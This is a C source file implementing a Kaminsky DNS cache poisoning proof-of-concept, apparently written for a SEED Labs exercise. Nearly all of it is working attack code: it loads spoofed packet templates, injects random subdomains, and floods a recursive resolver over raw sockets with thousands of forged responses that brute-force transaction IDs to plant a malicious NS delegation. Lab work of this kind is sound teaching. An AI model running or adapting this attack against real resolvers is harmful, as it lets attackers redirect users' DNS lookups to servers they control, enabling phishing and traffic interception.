/*
 * Kaminsky DNS Cache Poisoning Attack Implementation
 * --------------------------------------------------
 * This program implements a Proof-of-Concept for the Kaminsky DNS attack,
 * designed for educational purposes (SEED Labs). It floods a recursive resolver
 * with spoofed DNS responses containing a malicious NS record (delegation).
 */

#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define MAX_PAYLOAD_SIZE 1500
#define SUBDOMAIN_LEN 5
#define TX_ID_RANGE 65536
#define RESPONSES_PER_QUERY 3000

/* IP Header structure for raw packet construction */
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_flag:3, iph_offset:13;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    struct in_addr     iph_sourceip;
    struct in_addr     iph_destip;
};

/* Prototypes */
void send_raw_packet(char *buffer, int pkt_size);

int main() {
    srand(time(NULL));

    /* 1. Load Pre-crafted Packet Templates */
    unsigned char request_template[MAX_PAYLOAD_SIZE];
    unsigned char response_template[MAX_PAYLOAD_SIZE];

    FILE *f_req = fopen("ip_req.bin", "rb");
    if (!f_req) {
        perror("[-] [Critical] Failed to open 'ip_req.bin'");
        return EXIT_FAILURE;
    }
    int req_size = fread(request_template, 1, MAX_PAYLOAD_SIZE, f_req);
    fclose(f_req);

    FILE *f_resp = fopen("ip_resp.bin", "rb");
    if (!f_resp) {
        perror("[-] [Critical] Failed to open 'ip_resp.bin'");
        return EXIT_FAILURE;
    }
    int resp_size = fread(response_template, 1, MAX_PAYLOAD_SIZE, f_resp);
    fclose(f_resp);

    const char *charset = "abcdefghijklmnopqrstuvwxyz";
    printf("[+] Initializing Kaminsky Poisoning Engine...\n");
    printf("[*] Batching %d spoofed responses per iteration.\n", RESPONSES_PER_QUERY);

    unsigned int iteration = 0;
    while (1) {
        char sub_domain[SUBDOMAIN_LEN + 1];
        sub_domain[SUBDOMAIN_LEN] = '\0';
        
        /* 2. Generate unique subdomain to bypass recursive cache */
        for (int k = 0; k < SUBDOMAIN_LEN; k++) {
            sub_domain[k] = charset[rand() % 26];
        }

        /* 3. Inject subdomain into DNS Request Template (Offset 41) */
        memcpy(request_template + 41, sub_domain, SUBDOMAIN_LEN); 
        send_raw_packet((char *)request_template, req_size);

        /* 4. Flood resolver with spoofed DNS responses (Brute-forcing TX IDs) */
        for (int i = 0; i < RESPONSES_PER_QUERY; i++) {
            /* Inject subdomain into Query and Authority sections */
            memcpy(response_template + 41, sub_domain, SUBDOMAIN_LEN); // Question Name
            memcpy(response_template + 64, sub_domain, SUBDOMAIN_LEN); // Authority Section Reference

            /* Generate and inject random Transaction ID (UDP Offset 28) */
            unsigned short tx_id = rand() % TX_ID_RANGE;
            unsigned short tx_id_net = htons(tx_id); 
            memcpy(response_template + 28, &tx_id_net, 2);

            send_raw_packet((char *)response_template, resp_size);
        }

        /* Status Reporting */
        if (++iteration % 100 == 0) {
            printf("[*] Completed %u iterations. Continuing attack...\n", iteration);
        }
    }

    return EXIT_SUCCESS;
}

/**
 * send_raw_packet: Sends a raw IPv4 packet using SOCK_RAW.
 * Requires root privileges for raw socket access.
 */
void send_raw_packet(char *buffer, int pkt_size) {
    struct sockaddr_in dest_info;
    int flag = 1;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("[-] [Socket Error] Ensure you are running with sudo/root privileges");
        exit(EXIT_FAILURE);
    }

    /* Instruct kernel not to prepend its own IP header */
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &flag, sizeof(flag)) < 0) {
        perror("[-] [Socket Option Error]");
        close(sock);
        return;
    }

    struct ipheader *ip = (struct ipheader *)buffer;
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    if (sendto(sock, buffer, pkt_size, 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) < 0) {
        perror("[-] [Send Error]");
    }

    close(sock);
}
